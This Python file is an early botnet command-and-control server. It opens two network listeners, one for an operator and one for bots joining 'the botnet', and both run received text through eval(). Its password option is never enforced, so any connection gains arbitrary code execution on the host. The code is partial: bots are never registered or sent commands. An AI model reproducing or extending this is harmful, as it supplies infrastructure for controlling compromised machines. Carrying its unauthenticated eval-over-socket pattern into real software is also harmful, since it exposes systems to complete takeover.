import asyncio
from typing import List

import click
from asyncio.streams import StreamReader, StreamWriter


class Bot:
    def __init__(self, src_ip):
        self.src_ip = src_ip


class Context:
    def __init__(self, password):
        self.password: str = password
        self.bots: List[Bot] = []

    async def handle_cli_control(self, reader: StreamReader,
                                 writer: StreamWriter):
        request = None
        while request != 'quit':
            request = (await reader.read(255)).decode('utf8')
            response = str(eval(request)) + '\n'
            writer.write(response.encode('utf8'))
            await writer.drain()
        writer.close()

    async def handle_bot(self, reader: StreamReader, writer: StreamWriter):
        request = None
        while request != 'quit':
            request = (await reader.read(255)).decode('utf8')
            response = str(eval(request)) + '\n'
            writer.write(response.encode('utf8'))
            await writer.drain()
        writer.close()


@click.command()
@click.option(
    "--cac_port",
    "-cp",
    type=click.INT,
    default=6767,
    help="Port where command and control center listens",
)
@click.option(
    "--bot_port",
    "-bp",
    type=click.INT,
    default=6777,
    help="Port where bots should connect in order to join the botnet",
)
@click.option(
    "--secret_password",
    "-s",
    default="pass",
    help="Password needed for bots to connect",
)
@click.option(
    "--ip_address",
    "-i",
    default="0.0.0.0",
    help="Ip address for server to listen on",
)
def main(cac_port: int, bot_port: int, ip_address: str, secret_password: str):
    ctx = Context(secret_password)
    loop = asyncio.get_event_loop()

    # Start tcp server loop taking care of cli control connections
    loop.create_task(asyncio.start_server(ctx.handle_cli_control,
                                          ip_address,
                                          cac_port))

    # Start tcp server loop taking care of botnet connections
    loop.create_task(asyncio.start_server(ctx.handle_bot,
                                          ip_address,
                                          bot_port))

    print(f"Starting control listener via {ip_address}:{cac_port}")
    print(f"Starting bot client listener via {ip_address}:{bot_port}")
    loop.run_forever()


if __name__ == "__main__":
    main()

